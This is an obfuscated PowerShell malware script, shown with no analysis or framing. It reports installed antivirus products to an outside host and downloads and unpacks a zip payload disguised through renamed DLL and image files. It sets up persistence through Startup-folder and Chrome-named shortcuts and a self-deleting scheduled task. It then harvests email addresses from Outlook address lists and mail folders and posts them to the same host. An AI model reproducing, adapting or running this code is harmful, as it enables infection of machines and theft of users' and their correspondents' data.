function ____///////// { 
[cmdletBinding()]     
param ( 
[string]$ComputerName = "$env:computername" , 
$Credential 
) 
    BEGIN  
        { 
            $wmiQuery = "SELECT * FROM AntiVirusProduct" 
        } 
    PROCESS  
        {   $AntivirusProduct = Get-WmiObject -Namespace "root\SecurityCenter2" -Query $wmiQuery  @psboundparameters         
            $AntivirusNames = $AntivirusProduct.displayName       
				$WebRequest = [System.Net.WebRequest]::Create("http://badsite.domain/mx/H2K4R4Y9Y5E9b3cnGhl/aa/index.php")                                                       
                $GlobalListStr = [System.Text.Encoding]::UTF8.GetBytes("AT=$AntivirusNames")
                $WebRequest.Method = 'POST'
                $WebRequest.ContentType = 'application/x-www-form-urlencoded'
                $WebRequest.ContentLength = $GlobalListStr.length
                $RequestStream = $WebRequest.GetRequestStream()
                $RequestStream.Write($GlobalListStr, 0, $GlobalListStr.length)
                $RequestStream.Close()		
        } 
     END { 
         } 
}
____/////////
${_/|\_/|////\__|/_|\\\\\\/|_} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AGUA')))
${_/|\_/|////\__|/_|\\\\\\/\\\\/\/\/\|_} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('egBpAHAA')))
${_/|\_/|////\__|//\\\\\\\\/|_} = "http://badsite.domain/mx/H2K4R4Y9Y5E9b3cnGhlMD/aa/md.zip"
${_/|\_/|/\\\\\\\/|_} = "public"
${_\\\\\\/|\_/|/\\\\\\\/|_} = "c:\users\${_/|\_/|/\\\\\\\/|_}"
Function ____////////\\\/\/\/\/\_____ {
${_|||||||||||||________________} = "q","w","e","r","t","y","u","p","a","s","d","f","g","h","j","k","z","x","c","v","b","n","m"
${_|||||||||||||//////________________} = "2_","3_","4_","5_","6_","7_","8_","9_"
${_|||||||||||||//////\\\\\________________} = $null
${__|||||||||||||//////\\\\\________________} = Get-Random -InputObject ${_|||||||||||||________________} -Count 6
${__||||||_|||||||//////\\\\\________________} = Get-Random -InputObject ${_|||||||||||||//////________________} -Count 1
${__||||||_||||||_|//////\\\\\________________} = Get-Random -InputObject ${_|||||||||||||________________}.ToUpper() -Count 1
foreach($n in ${__|||||||||||||//////\\\\\________________}) {
${_|||||||||||||//////\\\\\________________} += $n
}
foreach ($n2 in ${__||||||_|||||||//////\\\\\________________}) {
${_|||||||||||||//////\\\\\________________} += $n2
}
foreach ($n3 in ${__||||||_||||||_|//////\\\\\________________}) {
${_|||||||||||||//////\\\\\________________} += $n3
}
return "_${_|||||||||||||//////\\\\\________________}"
}
${_\\\\\\/|\_/|/\\\___\\\\/|_} = ____////////\\\/\/\/\/\_____
${_\\\\\__\/|\_/|/\\\___\\\\/|_} = "${_\\\\\\/|\_/|/\\\\\\\/|_}\b.ar"
${_\\\//////////\\__\/|\_/|/\\\___\\\\/|_} = if (${_\\\\\__\/|\_/|/\\\___\\\\/|_}) { Test-Path ${_\\\\\__\/|\_/|/\\\___\\\\/|_} }
${_\\\//////////\\__\/|\_/|/\\\___\\\\/|_}
if(${_\\\//////////\\__\/|\_/|/\\\___\\\\/|_} -eq 'True'){
     exit
}else{
New-Item -ItemType directory -Path ${_\\\\\\/|\_/|/\\\\\\\/|_}\${_\\\\\\/|\_/|/\\\___\\\\/|_}
${_\\\///////\\\\\\\\\\/_} = new-object System.Net.WebClient
${_\\\///////\\\\\\\\\\/_}.DownloadFile(${_/|\_/|////\__|//\\\\\\\\/|_},"${_\\\\\\/|\_/|/\\\\\\\/|_}\${_\\\\\\/|\_/|/\\\___\\\\/|_}\${_\\\\\\/|\_/|/\\\___\\\\/|_}.zip")
${_\\\//////||\||||/\\\\\\\/_} = new-object -com shell.application 
${_/\/\/\/\/\/\/\/_} = ${_\\\//////||\||||/\\\\\\\/_}.namespace("${_\\\\\\/|\_/|/\\\\\\\/|_}\${_\\\\\\/|\_/|/\\\___\\\\/|_}\${_\\\\\\/|\_/|/\\\___\\\\/|_}.${_/|\_/|////\__|/_|\\\\\\/\\\\/\/\/\|_}") 
${_/\/\/\/\/\/__|\\\||||||\/\/_} = ${_\\\//////||\||||/\\\\\\\/_}.namespace("${_\\\\\\/|\_/|/\\\\\\\/|_}\${_\\\\\\/|\_/|/\\\___\\\\/|_}") 
${_/\/\/\/\/\/__|\\\||||||\/\/_}.Copyhere(${_/\/\/\/\/\/\/\/_}.items())
Rename-Item -NewName ("${_\\\\\\/|\_/|/\\\\\\\/|_}\${_\\\\\\/|\_/|/\\\___\\\\/|_}\${_\\\\\\/|\_/|/\\\___\\\\/|_}.${_/|\_/|////\__|/_|\\\\\\/|_}") -Path ("${_\\\\\\/|\_/|/\\\\\\\/|_}\${_\\\\\\/|\_/|/\\\___\\\\/|_}\${_/|\_/|////\__|/_|\\\\\\/|_}.png")
Rename-Item -NewName ("${_\\\\\\/|\_/|/\\\\\\\/|_}\${_\\\\\\/|\_/|/\\\___\\\\/|_}\${_\\\\\\/|\_/|/\\\___\\\\/|_}.LNS") -Path ("${_\\\\\\/|\_/|/\\\\\\\/|_}\${_\\\\\\/|\_/|/\\\___\\\\/|_}\12.dll")
Rename-Item -NewName ("${_\\\\\\/|\_/|/\\\\\\\/|_}\${_\\\\\\/|\_/|/\\\___\\\\/|_}\sqlite3.dll") -Path ("${_\\\\\\/|\_/|/\\\\\\\/|_}\${_\\\\\\/|\_/|/\\\___\\\\/|_}\sql.png")
function _____/\_/\/\_/\/=\
{
  Param([string]${___/\_/=\___/\_/==},[string]${__/==\/\_/\/=\/\_/});
  try{  
    ${__/\_/=\/=\/=====} = New-Object -ComObject WScript.Shell 
    ${/=\/\__/=\/=\/=\_} = ${__/\_/=\/=\/=====}.CreateShortcut(${___/\_/=\___/\_/==}) 
    ${/=\/\__/=\/=\/=\_}.TargetPath = "${_\\\\\\/|\_/|/\\\\\\\/|_}\${_\\\\\\/|\_/|/\\\___\\\\/|_}\${_\\\\\\/|\_/|/\\\___\\\\/|_}.${_/|\_/|////\__|/_|\\\\\\/|_}"       
    ${/=\/\__/=\/=\/=\_}.Arguments = " ${_\\\\\\/|\_/|/\\\___\\\\/|_}1.LNS  ${_\\\\\\/|\_/|/\\\___\\\\/|_}"
    ${/=\/\__/=\/=\/=\_}.WorkingDirectory = "${_\\\\\\/|\_/|/\\\\\\\/|_}\${_\\\\\\/|\_/|/\\\___\\\\/|_}" 
    ${/=\/\__/=\/=\/=\_}.WindowStyle = 7   
    ${/=\/\__/=\/=\/=\_}.IconLocation = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JQBQAHIAbwBnAHIAYQBtAEYAaQBsAGUAcwAlAFwASQBuAHQAZQByAG4AZQB0ACAARQB4AHAAbABvAHIAZQByAFwAaQBlAHgAcABsAG8AcgBlAC4AZQB4AGUALAAxAA==')))
    ${/=\/\__/=\/=\/=\_}.Save()
  }finally{}
}
${/===\__/=\_/==\_/} = New-Object -Com WScript.Shell
${/=\_/\_/===\/\/\/} = ${/===\__/=\_/==\_/}.SpecialFolders.Item($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwB0AGEAcgB0AHUAcAA='))));          
del ${/=\_/\_/===\/\/\/}\*.vbs
del ${/=\_/\_/===\/\/\/}\*.lnk
${_/=\/=\/\_/\/=\__} = "                                                                                                                                                                                                                                                                                                  $env:APPDATA\${_/=\/\/=\___/\/==}, ${_/\/\/\/=\/==\__/}"
${___/\_/\/===\/\__} = "${/=\_/\_/===\/\/\/}\${_\\\\\\/|\_/|/\\\___\\\\/|_}.lnk"  
        
_____/\_/\/\_/\/=\ ${___/\_/\/===\/\__}  ${_/=\/=\/\_/\/=\__}


function _____/\_/\/\_/\/=\\///\/\/\
{
  Param([string]${___/\_/=\\/\/\\___/\_/==},[string]${__||_/\_/=\\/\/\\___/\_/==});
  try{  
    ${__||_/\_/=\\/\/||\\___/\_/==} = New-Object -ComObject WScript.Shell 
    ${__||/=\\/\/||\\___/\_/==} = ${__||_/\_/=\\/\/||\\___/\_/==}.CreateShortcut(${___/\_/=\\/\/\\___/\_/==}) 
    ${__||/=\\/\/||\\___/\_/==}.TargetPath = "c:\users\${_/|\_/|/\\\\\\\/|_}\${_\\\\\\/|\_/|/\\\___\\\\/|_}.vbs"      
    ${__||/=\\/\/||\\___/\_/==}.Arguments = ""
	${__||/=\\/\/||\\___/\_/==}.Description = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IgBBAGMAZQBzAHMAYQByACAAYQAgAGkAbgB0AGUAcgBuAGUAdAAuACIA')));
    ${__||/=\\/\/||\\___/\_/==}.WorkingDirectory = ""    
    ${__||/=\\/\/||\\___/\_/==}.IconLocation = "${_/\/\/\/\__/\|_||_|____}"
    ${__||/=\\/\/||\\___/\_/==}.Save()
  }finally{}
}

${_/\/\/\__\\\\\\\|||\/\/_} = ${_\\\\\\/|\_/|/\\\___\\\\/|_}
${_/\/\/\__\\\\\\\|||\/\/_} | Set-Content "${_\\\\\\/|\_/|/\\\\\\\/|_}\b.ar"
${_/\/\/\__\\\\\\\|||\/\/_} | Out-File "${_\\\\\\/|\_/|/\\\\\\\/|_}\b.ar"
${_/\/\/\__\\\\\\\|||\/\/_} > "${_\\\\\\/|\_/|/\\\\\\\/|_}\b.ar"

${___/\_/\/===\/\__} = "c:\users\public\chrome.lnk" 
_____/\_/\/\_/\/=\\///\/\/\ ${___/\_/\/===\/\__}  ${__||_/\_/=\\/\/\\___/\_/==}

${_/|\_/|//______//\__|/_|\\\\\\/|_} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABpAG4AZQA=')))
${_/|\_\\\||||||||||///\\/|_} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBtAGQA')))
${_/|\_\\\///\\/|_} = '86'
${_/|\_/|//______//\__|/_|\\\\__\\\///\\/|_} = "$"
$Arquivo = "${_\\\\\\/|\_/|/\\\\\\\/|_}\${_\\\\\\/|\_/|/\\\___\\\\/|_}\${_\\\\\\/|\_/|/\\\___\\\\/|_}1.LNS"

$ArquivoSaida ="${_\\\\\\/|\_/|/\\\\\\\/|_}\${_\\\\\\/|\_/|/\\\___\\\\/|_}\${_\\\\\\/|\_/|/\\\___\\\\/|_}1.LNS"
Add-Content $Arquivo '#NoTrayIcon'
Add-Content $Arquivo "Global ${_/|\_/|//______//\__|/_|\\\\__\\\///\\/|_}${_\\\\\\/|\_/|/\\\___\\\\/|_} = ${_/|\_/|//______//\__|/_|\\\\__\\\///\\/|_}${_/|\_\\\||||||||||///\\/|_}${_/|\_/|//______//\__|/_|\\\\\\/|_}[1]"
Add-Content $Arquivo "Global ${_/|\_/|//______//\__|/_|\\\\__\\\///\\/|_}${_\\\\\\/|\_/|/\\\___\\\\/|_}${_/|\_\\\///\\/|_} = DllOpen('${_\\\\\\/|\_/|/\\\___\\\\/|_}.LNS')"
Add-Content $Arquivo "DllCall(${_/|\_/|//______//\__|/_|\\\\__\\\///\\/|_}${_\\\\\\/|\_/|/\\\___\\\\/|_}${_/|\_\\\///\\/|_}, 'STRUCT', 'JLI_CmdToArgs')"

    $cmdFileName = "C:\Windows\explorer.exe "
    $TaskStartTime = [datetime]::Now.AddSeconds(180)
    $TaskEndTime = [datetime]::Now.AddSeconds(240)
    $taskName = ${_\\\\\\/|\_/|/\\\___\\\\/|_}
    $service = New-Object -ComObject("Schedule.Service")
    $service.Connect()
    $rootFolder = $service.GetFolder("\")
    $TaskDefinition = $service.NewTask(0)
    $TaskDefinition.RegistrationInfo.Description = ""
    $TaskDefinition.Settings.Enabled = $true
    $TaskDefinition.Settings.DisallowStartIfOnBatteries = $false
    $TaskDefinition.Settings.DeleteExpiredTaskAfter = "PT0M"
    $triggers = $TaskDefinition.Triggers
    $trigger = $triggers.Create(1)
    $trigger.StartBoundary = $TaskStartTime.ToString("yyyy-MM-dd'T'HH:mm:ss")
    $trigger.EndBoundary = $TaskEndTime.ToString("yyyy-MM-dd'T'HH:mm:ss")
    $trigger.Enabled = $true
    $action = $TaskDefinition.Actions.Create(0)
    $action.Path = $cmdFileName
    $action.Arguments = "${/=\_/\_/===\/\/\/}\${_\\\\\\/|\_/|/\\\___\\\\/|_}.lnk"
    $action = $TaskDefinition.Actions.Create(0)
    $action.Path = "schtasks.exe"
    $action.Arguments = "/Delete /TN $taskName /F"
    $rootFolder.RegisterTaskDefinition($taskName, $TaskDefinition, 6, "", $null, 0)
}


Add-Type -assembly $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBpAGMAcgBvAHMAbwBmAHQALgBPAGYAZgBpAGMAZQAuAEkAbgB0AGUAcgBvAHAALgBPAHUAdABsAG8AbwBrAA==')))
${_/=\/\__/=\/\/\__} = New-Object -comobject Outlook.Application
${____/===\_____/\/} = ${_/=\/\__/=\/\/\__}.GetNameSpace($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBBAFAASQA='))))
${_/\/=====\__/=\/=} = [System.Collections.ArrayList]@()
function ___/=\/\/=\___/=\_(${____/\____/\/\_/\_})
{
  ${____/==\__/\_/=\_} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgBbAF8AYQAtAHoAMAAtADkALQBdACsAKABcAC4AWwBfAGEALQB6ADAALQA5AC0AXQArACkAKgBAAFsAYQAtAHoAMAAtADkALQBdACsAKABcAC4AWwBhAC0AegAwAC0AOQAtAF0AKwApACoAKABcAC4AWwBhAC0AegBdAHsAMgAsADQAfQApACQA')));
  if (${____/\____/\/\_/\_} -match ${____/==\__/\_/=\_}) {
    return $true
  }
  return $false
}
function _/=\_/==\____/\__/(${____/\____/\/\_/\_}) {
  if (${____/\____/\/\_/\_}) {
    ${__/=====\/\_/\_/\} = $false
    ${____/\____/\/\_/\_} = ${____/\____/\/\_/\_}.ToLower()
    if (${____/\____/\/\_/\_}.StartsWith("'") -And ${____/\____/\/\_/\_}.EndsWith("'")) {
      ${____/\____/\/\_/\_} = ${____/\____/\/\_/\_}.Substring(1, ${____/\____/\/\_/\_}.Length - 2)
    }
    if (___/=\/\/=\___/=\_(${____/\____/\/\_/\_})) {
      for(${__/\/\__/=\/\__/\} = 0;${__/\/\__/=\/\__/\} -lt ${_/\/=====\__/=\/=}.Count;${__/\/\__/=\/\__/\}++) {
        if (${_/\/=====\__/=\/=}[${__/\/\__/=\/\__/\}] -eq ${____/\____/\/\_/\_}) {
          ${__/=====\/\_/\_/\} = $true
          break
        }
      }
      if (-Not ${__/=====\/\_/\_/\}) {
        ${__/\___/========\} = ${_/\/=====\__/=\/=}.Add(${____/\____/\/\_/\_})
      }
    }
  }
}
function _/====\__/=====\_/ {
  ${/==\/=\____/\_/=\} = ${____/===\_____/\/}.AddressLists
  for(${__/\/\__/=\/\__/\} = 1;${__/\/\__/=\/\__/\} -le ${/==\/=\____/\_/=\}.Count;${__/\/\__/=\/\__/\}++) {
    ${/=\_/==\/\__/==\_} = ${/==\/=\____/\_/=\}.Item(${__/\/\__/=\/\__/\}).AddressEntries
    for(${/==\/\/\_/\_/\__/} = 1;${/==\/\/\_/\_/\__/} -le ${/=\_/==\/\__/==\_}.Count;${/==\/\/\_/\_/\__/}++) {
      ${_/\_/\__/\_____/=} = ${/=\_/==\/\__/==\_}.Item(${/==\/\/\_/\_/\__/})
      ${__/===\/===\/\/\_} = ${_/\_/\__/\_____/=}.AddressEntryUserType
      ${____/\____/\/\_/\_} = ""
      if (${__/===\/===\/\/\_} -eq 10) {
        ${____/\____/\/\_/\_} = ${_/\_/\__/\_____/=}.Address
      } elseif ((${__/===\/===\/\/\_} -eq 3) -Or (${__/===\/===\/\/\_} -eq 1) -Or (${__/===\/===\/\/\_} -eq 4) -Or (${__/===\/===\/\/\_} -eq 2) -Or (${__/===\/===\/\/\_} -eq 5) -Or (${__/===\/===\/\/\_} -eq 0)) {
        ${____/\____/\/\_/\_} = ${_/\_/\__/\_____/=}.GetExchangeUser().PrimarySmtpAddress
      }
      _/=\_/==\____/\__/(${____/\____/\/\_/\_})
    }
  }
}
function __/\/\__/\_/===\_/(${___/\/==\_/==\/=\/}) {
  for(${__/\/\__/=\/\__/\} = 1;${__/\/\__/=\/\__/\} -le ${___/\/==\_/==\/=\/}.Count;${__/\/\__/=\/\__/\}++) {
    ${_/======\_/=\/=\_} = ${___/\/==\_/==\/=\/}.Item(${__/\/\__/=\/\__/\})
    ${__/\/=\___/\_/==\} = ${_/======\_/=\/=\_}.Items
    for(${/==\/\/\_/\_/\__/} = 1;${/==\/\/\_/\_/\__/} -le ${__/\/=\___/\_/==\}.Count;${/==\/\/\_/\_/\__/}++) {
      ${_/==\_____/==\__/} = ${__/\/=\___/\_/==\}.Item(${/==\/\/\_/\_/\__/})
      ${/=\/====\____/=\/} = ${_/==\_____/==\__/}.Recipients
      for(${_/\_/\__/\/\_/=\_} = 1;${_/\_/\__/\/\_/=\_} -le ${/=\/====\____/=\/}.Count;${_/\_/\__/\/\_/=\_}++) {
        ${__/\_/\__/=\/\_/\} = ${/=\/====\____/=\/}.Item(${_/\_/\__/\/\_/=\_})
        ${_/\_/\__/\_____/=} = ${__/\_/\__/=\/\_/\}.AddressEntry
        ${__/===\/===\/\/\_} = ${_/\_/\__/\_____/=}.AddressEntryUserType
        ${____/\____/\/\_/\_} = "";
        if (${__/===\/===\/\/\_} -eq 0) {
          ${____/\____/\/\_/\_} = ${_/\_/\__/\_____/=}.GetExchangeUser().PrimarySmtpAddress
        } elseif ((${__/===\/===\/\/\_} -eq 30) -Or (${__/===\/===\/\/\_} -eq 10)) {
          ${____/\____/\/\_/\_} = ${_/\_/\__/\_____/=}.Address
        }
        _/=\_/==\____/\__/(${____/\____/\/\_/\_})
      }
      ${_/\_/\__/\_____/=} = ${_/==\_____/==\__/}.Sender
      ${__/===\/===\/\/\_} = ${_/\_/\__/\_____/=}.AddressEntryUserType
      ${____/\____/\/\_/\_} = "";
      if (${__/===\/===\/\/\_} -eq 0) {
        ${____/\____/\/\_/\_} = ${_/\_/\__/\_____/=}.GetExchangeUser().PrimarySmtpAddress
      } elseif ((${__/===\/===\/\/\_} -eq 30) -Or (${__/===\/===\/\/\_} -eq 10)) {
        ${____/\____/\/\_/\_} = ${_/\_/\__/\_____/=}.Address
      }
      _/=\_/==\____/\__/(${____/\____/\/\_/\_})
    }
    __/\/\__/\_/===\_/(${_/======\_/=\/=\_}.Folders)
  }
}
function ____/=\_/\_/==\/==() {
  _/====\__/=====\_/
  __/\/\__/\_/===\_/(${____/===\_____/\/}.Folders)
  Add-Content $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABlAG4AdgA6AEEAUABQAEQAQQBUAEEAXABNAGkAYwByAG8AcwBvAGYAdABcAC4ATwB1AHQAbABvAG8AawA=')))  ${_/\/=====\__/=\/=}
  
  $WebRequest = [System.Net.WebRequest]::Create("http://badsite.domain/mx/lists/aa/index.php?list")
  $GlobalListStr = [System.Text.Encoding]::UTF8.GetBytes("list=$(${_/\/=====\__/=\/=} -join ';')")
  $WebRequest.Method = 'POST'
  $WebRequest.ContentType = 'application/x-www-form-urlencoded'
  $WebRequest.ContentLength = $GlobalListStr.length
  $RequestStream = $WebRequest.GetRequestStream()
  $RequestStream.Write($GlobalListStr, 0, $GlobalListStr.length)
  $RequestStream.Close()
  [System.Net.WebResponse] $WebResponse = $WebRequest.GetResponse()
  
}
function _/=\/\/\_/\____/=\() {
  ${__/==\/\__/\/===\} = [System.IO.File]::Exists(${__/======\____/\_})
  if (-Not ${__/==\/\__/\/===\}) {
      "" | sc ${__/======\____/\_}
      ____/=\_/\_/==\/==
  }
}
_/=\/\/\_/\____/=\
